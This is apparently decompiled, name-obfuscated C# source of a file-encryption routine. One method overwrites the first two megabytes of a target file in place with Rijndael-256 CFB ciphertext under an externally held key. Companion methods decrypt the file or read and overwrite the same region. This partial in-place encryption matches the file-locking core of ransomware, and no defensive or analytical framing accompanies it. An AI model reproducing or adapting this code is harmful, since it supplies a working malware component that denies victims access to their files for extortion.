using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal static class Class2
{
	public static readonly int int_0 = 2097152;

	public static bool smethod_0(Class1 class1_0)
	{
		if (Class7.smethod_6() == null)
		{
			return false;
		}
		if (!File.Exists(class1_0.FileInfo_0.FullName))
		{
			return false;
		}
		try
		{
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				byte[] bytes = Encoding.ASCII.GetBytes(Class7.smethod_6().String_0);
				byte[] bytes2 = Encoding.ASCII.GetBytes(Class7.smethod_6().String_1);
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 256;
				rijndaelManaged.Mode = CipherMode.CFB;
				rijndaelManaged.FeedbackSize = 256;
				rijndaelManaged.Padding = PaddingMode.None;
				using FileStream fileStream = new FileStream(class1_0.FileInfo_0.FullName, FileMode.Open, FileAccess.ReadWrite);
				int num = 0;
				num = (int)((fileStream.Length >= int_0) ? int_0 : (fileStream.Length - fileStream.Length % 32L));
				byte[] buffer = new byte[num];
				fileStream.Read(buffer, 0, num);
				using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes, bytes2);
				using MemoryStream memoryStream = new MemoryStream();
				using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
				cryptoStream.Write(buffer, 0, num);
				cryptoStream.Flush();
				cryptoStream.FlushFinalBlock();
				cryptoStream.Flush();
				fileStream.Position = 0L;
				buffer = memoryStream.ToArray();
				fileStream.Write(buffer, 0, num);
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_1(Class1 class1_0)
	{
		if (Class7.smethod_6() == null)
		{
			return false;
		}
		if (!File.Exists(class1_0.FileInfo_0.FullName))
		{
			return false;
		}
		try
		{
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				byte[] bytes = Encoding.ASCII.GetBytes(Class7.smethod_6().String_0);
				byte[] bytes2 = Encoding.ASCII.GetBytes(Class7.smethod_6().String_1);
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 256;
				rijndaelManaged.Mode = CipherMode.CFB;
				rijndaelManaged.FeedbackSize = 256;
				rijndaelManaged.Padding = PaddingMode.None;
				using FileStream fileStream = new FileStream(class1_0.FileInfo_0.FullName, FileMode.Open, FileAccess.ReadWrite);
				int num = 0;
				num = (int)((fileStream.Length >= int_0) ? int_0 : (fileStream.Length - fileStream.Length % 32L));
				byte[] buffer = new byte[num];
				fileStream.Read(buffer, 0, num);
				using ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes, bytes2);
				using MemoryStream memoryStream = new MemoryStream();
				using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
				cryptoStream.Write(buffer, 0, num);
				cryptoStream.Flush();
				cryptoStream.FlushFinalBlock();
				cryptoStream.Flush();
				fileStream.Position = 0L;
				buffer = memoryStream.ToArray();
				fileStream.Write(buffer, 0, num);
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] smethod_2(Class1 class1_0)
	{
		if (!File.Exists(class1_0.FileInfo_0.FullName))
		{
			return new byte[0];
		}
		try
		{
			byte[] array;
			using (FileStream fileStream = new FileStream(class1_0.FileInfo_0.FullName, FileMode.Open, FileAccess.ReadWrite))
			{
				int num = 0;
				num = (int)((fileStream.Length >= int_0) ? int_0 : (fileStream.Length - fileStream.Length % 32L));
				array = new byte[num];
				fileStream.Read(array, 0, num);
			}
			return array;
		}
		catch
		{
			return new byte[0];
		}
	}

	public static bool smethod_3(Class1 class1_0, byte[] byte_0)
	{
		if (!File.Exists(class1_0.FileInfo_0.FullName))
		{
			return false;
		}
		try
		{
			using (FileStream fileStream = new FileStream(class1_0.FileInfo_0.FullName, FileMode.Open, FileAccess.ReadWrite))
			{
				int num = 0;
				num = (int)((fileStream.Length >= int_0) ? int_0 : (fileStream.Length - fileStream.Length % 32L));
				fileStream.Write(byte_0, 0, num);
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}
}
